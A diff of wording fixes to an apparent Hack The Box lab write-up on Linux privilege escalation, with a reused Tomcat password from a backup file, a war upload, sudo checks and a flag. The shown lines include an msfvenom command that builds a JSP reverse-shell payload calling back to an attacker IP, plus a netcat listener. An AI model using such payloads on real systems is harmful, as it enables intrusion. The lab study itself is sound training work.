@@ -26,7 +26,6 @@ drwxr-xr-x 5 root        root        4096 Sep  6  2020 ..
 drwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cache
 drwxr-xr-x 2 root        root        4096 Sep  6  2020 .config
 -rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile
-htb-student@nix03:~$ cd .config
 ```
 
 We can see an interesting `.config` folder in our home
@@ -114,7 +113,7 @@ Here it tells us what directory the Tomcat service is running out of, `/var/lib/
 
 ![image.png](image%203.png)
 
-After digging around we can see the `tomcat-users.xml` file on the `conf` directory which is unreadable to us, however we can read the backup file! We also could’ve found this by using the find command:
+After digging around we can see the `tomcat-users.xml` file in the `conf` directory which is unreadable to us, however we can read the backup file! We also could’ve found this by using the find command:
 
 ```bash
 find / -type f -name *.bak -exec ls -l {} \; 2>/dev/null
@@ -136,11 +135,11 @@ From here we can upload and deploy a `war` file. We can craft a reverse shell pa
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.207 LPORT=4444 -f war > shell.war
 ```
 
-We can see it on the admin page:
+Once uploaded we can see it on the admin page:
 
 ![image.png](image%206.png)
 
-And I simply started a listener, and clicked on the shell link:
+Then I started a simple netcat listener, and clicked on the shell link:
 
 ![image.png](image%207.png)
 
@@ -158,7 +157,7 @@ cat flag4.txt
 LLPE{im_th3_m@nag3r_n0w}
 ```
 
-And checked if we can run any sudo commads without a password:
+I then checked if I could run any sudo commads without a password:
 
 ![image.png](image%208.png)
 
@@ -174,4 +173,4 @@ And using this we can escalate to the root user:
 
 Nice! That was the box. All in all it was a fun challenge.
 
-Thanks for reading! Cheets
+Thanks for reading! Cheers
